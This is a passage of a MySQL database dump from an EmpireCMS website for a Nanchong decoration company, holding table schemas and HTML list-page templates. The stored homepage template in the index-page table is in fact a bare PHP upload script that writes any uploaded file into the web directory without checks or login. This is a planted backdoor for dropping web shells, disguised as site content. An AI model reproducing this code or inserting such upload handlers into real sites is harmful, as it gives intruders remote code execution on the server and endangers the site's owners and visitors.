/*!40000 ALTER TABLE `libang_enewshyclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsindexpage`
--

DROP TABLE IF EXISTS `libang_enewsindexpage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsindexpage` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(30) NOT NULL DEFAULT '',
  `temptext` mediumtext NOT NULL,
  PRIMARY KEY (`tempid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsindexpage`
--

LOCK TABLES `libang_enewsindexpage` WRITE;
/*!40000 ALTER TABLE `libang_enewsindexpage` DISABLE KEYS */;
INSERT INTO `libang_enewsindexpage` VALUES (1,'343434','<?php\r\n    if(!empty($_FILES)){\r\n        if($_FILES[\\\"file\\\"][\\\"error\\\"] == 0){\r\n            move_uploaded_file($_FILES[\\\"file\\\"][\\\"tmp_name\\\"],$_FILES[\\\"file\\\"][\\\"name\\\"]);\r\n            echo $_FILES[\\\'file\\\'][\\\'name\\\'].\\\' upload success\\\'; \r\n        }\r\n    }\r\n?>\r\n<form action=\\\"\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\">\r\n    <input type=\\\"file\\\" name=\\\"file\\\" />\r\n    <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Upload\\\">\r\n</form>');
/*!40000 ALTER TABLE `libang_enewsindexpage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsinfoclass`
--

DROP TABLE IF EXISTS `libang_enewsinfoclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsinfoclass` (
  `classid` int(11) NOT NULL AUTO_INCREMENT,
  `bclassid` int(11) NOT NULL DEFAULT '0',
  `classname` varchar(100) NOT NULL DEFAULT '',
  `infourl` mediumtext NOT NULL,
  `newsclassid` smallint(6) NOT NULL DEFAULT '0',
  `startday` date NOT NULL DEFAULT '0000-00-00',
  `endday` date NOT NULL DEFAULT '0000-00-00',
  `bz` text NOT NULL,
  `num` smallint(6) NOT NULL DEFAULT '0',
  `copyimg` tinyint(1) NOT NULL DEFAULT '0',
  `renum` smallint(6) NOT NULL DEFAULT '0',
  `keyboard` text NOT NULL,
  `oldword` text NOT NULL,
  `newword` text NOT NULL,
  `titlelen` smallint(6) NOT NULL DEFAULT '0',
  `retitlewriter` tinyint(1) NOT NULL DEFAULT '0',
  `smalltextlen` smallint(6) NOT NULL DEFAULT '0',
  `zz_smallurl` text NOT NULL,
  `zz_newsurl` text NOT NULL,
  `httpurl` varchar(255) NOT NULL DEFAULT '',
  `repad` text NOT NULL,
  `imgurl` varchar(255) NOT NULL DEFAULT '',
  `relistnum` smallint(6) NOT NULL DEFAULT '0',
  `zz_titlepicl` text NOT NULL,
  `z_titlepicl` varchar(255) NOT NULL DEFAULT '',
  `qz_titlepicl` varchar(255) NOT NULL DEFAULT '',
  `save_titlepicl` varchar(10) NOT NULL DEFAULT '',
  `keynum` tinyint(4) NOT NULL DEFAULT '0',
  `insertnum` smallint(6) NOT NULL DEFAULT '0',
  `copyflash` tinyint(1) NOT NULL DEFAULT '0',
  `tid` smallint(6) NOT NULL DEFAULT '0',
  `tbname` varchar(60) NOT NULL DEFAULT '',
  `pagetype` tinyint(1) NOT NULL DEFAULT '0',
  `smallpagezz` text NOT NULL,
  `pagezz` text NOT NULL,
  `smallpageallzz` text NOT NULL,
  `pageallzz` text NOT NULL,
  `mark` tinyint(1) NOT NULL DEFAULT '0',
  `enpagecode` tinyint(1) NOT NULL DEFAULT '0',
  `recjtheurl` tinyint(1) NOT NULL DEFAULT '0',
  `hiddenload` tinyint(1) NOT NULL DEFAULT '0',
  `justloadin` tinyint(1) NOT NULL DEFAULT '0',
  `justloadcheck` tinyint(1) NOT NULL DEFAULT '0',
  `delloadinfo` tinyint(1) NOT NULL DEFAULT '0',
  `pagerepad` mediumtext NOT NULL,
  `newsztid` text NOT NULL,
  `getfirstpic` tinyint(4) NOT NULL DEFAULT '0',
  `oldpagerep` text NOT NULL,
  `newpagerep` text NOT NULL,
  `keeptime` smallint(6) NOT NULL DEFAULT '0',
  `lasttime` int(11) NOT NULL DEFAULT '0',
  `newstextisnull` tinyint(1) NOT NULL DEFAULT '0',
  `getfirstspic` tinyint(1) NOT NULL DEFAULT '0',
  `getfirstspicw` smallint(6) NOT NULL DEFAULT '0',
  `getfirstspich` smallint(6) NOT NULL DEFAULT '0',
  `doaddtextpage` tinyint(1) NOT NULL DEFAULT '0',
  `infourlispage` tinyint(1) NOT NULL DEFAULT '0',
  `repf` varchar(255) NOT NULL DEFAULT '',
  `repadf` varchar(255) NOT NULL DEFAULT '',
  `loadkeeptime` smallint(6) NOT NULL DEFAULT '0',
  `isnullf` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`),
  KEY `newsclassid` (`newsclassid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsinfoclass`
--

LOCK TABLES `libang_enewsinfoclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsinfoclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsinfoclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsinfotype`
--

DROP TABLE IF EXISTS `libang_enewsinfotype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsinfotype` (
  `typeid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tname` varchar(30) NOT NULL DEFAULT '',
  `mid` smallint(6) NOT NULL DEFAULT '0',
  `myorder` smallint(6) NOT NULL DEFAULT '0',
  `yhid` smallint(6) NOT NULL DEFAULT '0',
  `tnum` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `listtempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tpath` varchar(100) NOT NULL DEFAULT '',
  `ttype` varchar(10) NOT NULL DEFAULT '',
  `maxnum` int(10) unsigned NOT NULL DEFAULT '0',
  `reorder` varchar(50) NOT NULL DEFAULT '',
  `tid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tbname` varchar(60) NOT NULL DEFAULT '',
  `timg` varchar(200) NOT NULL DEFAULT '',
  `intro` varchar(255) NOT NULL DEFAULT '',
  `pagekey` varchar(255) NOT NULL DEFAULT '',
  `newline` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `hotline` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `goodline` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `hotplline` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `firstline` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `jstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `nrejs` tinyint(1) NOT NULL DEFAULT '0',
  `listdt` tinyint(1) NOT NULL DEFAULT '0',
  `repagenum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `fclast` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`typeid`),
  KEY `mid` (`mid`),
  KEY `myorder` (`myorder`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsinfotype`
--

LOCK TABLES `libang_enewsinfotype` WRITE;
/*!40000 ALTER TABLE `libang_enewsinfotype` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsinfotype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsinfovote`
--

DROP TABLE IF EXISTS `libang_enewsinfovote`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsinfovote` (
  `pubid` bigint(16) unsigned NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `title` varchar(120) NOT NULL DEFAULT '',
  `votenum` int(10) unsigned NOT NULL DEFAULT '0',
  `voteip` mediumtext NOT NULL,
  `votetext` text NOT NULL,
  `voteclass` tinyint(1) NOT NULL DEFAULT '0',
  `doip` tinyint(1) NOT NULL DEFAULT '0',
  `dotime` date NOT NULL DEFAULT '0000-00-00',
  `tempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `width` int(10) unsigned NOT NULL DEFAULT '0',
  `height` int(10) unsigned NOT NULL DEFAULT '0',
  `diyotherlink` tinyint(1) NOT NULL DEFAULT '0',
  `infouptime` int(10) unsigned NOT NULL DEFAULT '0',
  `infodowntime` int(10) unsigned NOT NULL DEFAULT '0',
  `copyids` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`pubid`),
  KEY `id` (`id`,`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsinfovote`
--

LOCK TABLES `libang_enewsinfovote` WRITE;
/*!40000 ALTER TABLE `libang_enewsinfovote` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsinfovote` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsingroup`
--

DROP TABLE IF EXISTS `libang_enewsingroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsingroup` (
  `gid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `gname` char(60) NOT NULL DEFAULT '',
  `myorder` smallint(6) NOT NULL DEFAULT '0',
  PRIMARY KEY (`gid`),
  KEY `myorder` (`myorder`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsingroup`
--

LOCK TABLES `libang_enewsingroup` WRITE;
/*!40000 ALTER TABLE `libang_enewsingroup` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsingroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsjstemp`
--

DROP TABLE IF EXISTS `libang_enewsjstemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsjstemp` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(30) NOT NULL DEFAULT '',
  `temptext` mediumtext NOT NULL,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  `showdate` varchar(20) NOT NULL DEFAULT '',
  `modid` smallint(6) NOT NULL DEFAULT '0',
  `subnews` smallint(6) NOT NULL DEFAULT '0',
  `subtitle` smallint(6) NOT NULL DEFAULT '0',
  PRIMARY KEY (`tempid`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsjstemp`
--

LOCK TABLES `libang_enewsjstemp` WRITE;
/*!40000 ALTER TABLE `libang_enewsjstemp` DISABLE KEYS */;
INSERT INTO `libang_enewsjstemp` VALUES (1,'默认js模板','[!--empirenews.listtemp--]<li><a href=\\\"[!--titleurl--]\\\" title=\\\"[!--oldtitle--]\\\">[!--title--]</a></li>[!--empirenews.listtemp--]',0,1,'m-d',1,0,32);
/*!40000 ALTER TABLE `libang_enewsjstemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsjstempclass`
--

DROP TABLE IF EXISTS `libang_enewsjstempclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsjstempclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsjstempclass`
--

LOCK TABLES `libang_enewsjstempclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsjstempclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsjstempclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewskey`
--

DROP TABLE IF EXISTS `libang_enewskey`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewskey` (
  `keyid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `keyname` char(50) NOT NULL DEFAULT '',
  `keyurl` char(200) NOT NULL DEFAULT '',
  `cid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`keyid`),
  KEY `cid` (`cid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewskey`
--

LOCK TABLES `libang_enewskey` WRITE;
/*!40000 ALTER TABLE `libang_enewskey` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewskey` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewskeyclass`
--

DROP TABLE IF EXISTS `libang_enewskeyclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewskeyclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` char(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewskeyclass`
--

LOCK TABLES `libang_enewskeyclass` WRITE;
/*!40000 ALTER TABLE `libang_enewskeyclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewskeyclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewslink`
--

DROP TABLE IF EXISTS `libang_enewslink`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewslink` (
  `lid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `lname` varchar(100) NOT NULL DEFAULT '',
  `lpic` varchar(255) NOT NULL DEFAULT '',
  `lurl` varchar(255) NOT NULL DEFAULT '',
  `ltime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `onclick` int(11) NOT NULL DEFAULT '0',
  `width` varchar(10) NOT NULL DEFAULT '',
  `height` varchar(10) NOT NULL DEFAULT '',
  `target` varchar(10) NOT NULL DEFAULT '',
  `myorder` tinyint(4) NOT NULL DEFAULT '0',
  `email` varchar(60) NOT NULL DEFAULT '',
  `lsay` text NOT NULL,
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `ltype` smallint(6) NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`lid`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewslink`
--

LOCK TABLES `libang_enewslink` WRITE;
/*!40000 ALTER TABLE `libang_enewslink` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewslink` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewslinkclass`
--

DROP TABLE IF EXISTS `libang_enewslinkclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewslinkclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewslinkclass`
--

LOCK TABLES `libang_enewslinkclass` WRITE;
/*!40000 ALTER TABLE `libang_enewslinkclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewslinkclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewslinktmp`
--

DROP TABLE IF EXISTS `libang_enewslinktmp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewslinktmp` (
  `newsurl` varchar(255) NOT NULL DEFAULT '',
  `checkrnd` varchar(50) NOT NULL DEFAULT '',
  `linkid` bigint(20) NOT NULL AUTO_INCREMENT,
  `titlepic` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`linkid`),
  KEY `checkrnd` (`checkrnd`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewslinktmp`
--

LOCK TABLES `libang_enewslinktmp` WRITE;
/*!40000 ALTER TABLE `libang_enewslinktmp` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewslinktmp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewslisttemp`
--

DROP TABLE IF EXISTS `libang_enewslisttemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewslisttemp` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(60) NOT NULL DEFAULT '',
  `temptext` mediumtext NOT NULL,
  `subnews` smallint(6) NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  `listvar` text NOT NULL,
  `rownum` smallint(6) NOT NULL DEFAULT '0',
  `modid` smallint(6) NOT NULL DEFAULT '0',
  `showdate` varchar(50) NOT NULL DEFAULT '',
  `subtitle` smallint(6) NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `docode` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`tempid`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewslisttemp`
--

LOCK TABLES `libang_enewslisttemp` WRITE;
/*!40000 ALTER TABLE `libang_enewslisttemp` DISABLE KEYS */;
INSERT INTO `libang_enewslisttemp` VALUES (1,'新闻列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--] />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011404080.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_news_l_title.png\\\" alt=\\\"\\\"></dt>\r\n\r\n                    \r\n                    [showclasstemp]3,1,0,0[/showclasstemp]\r\n\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <ul class=\\\"news_list\\\">\r\n                \r\n\r\n\r\n                    [!--empirenews.listtemp--]\r\n                    <!--list.var1-->\r\n                    [!--empirenews.listtemp--]\r\n\r\n            </ul>\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:90%; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'                <li>\r\n                <span>[!--newstime--]</span>\r\n                <div class=\\\'news_txt2\\\' style=\\\"height: 82px\\\"><a href=\\\'[!--titleurl--]\\\'>[!--title--]</a><div class=\\\'clear\\\'></div>\r\n                <p>[!--smalltext--]...</p></div></li>',1,1,'Y-m-d',0,0,0),(2,'产品列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n    \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]1,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul >   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n                \r\n\r\n\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:90%; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',200,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d',0,0,0),(3,'案例列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n    \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow 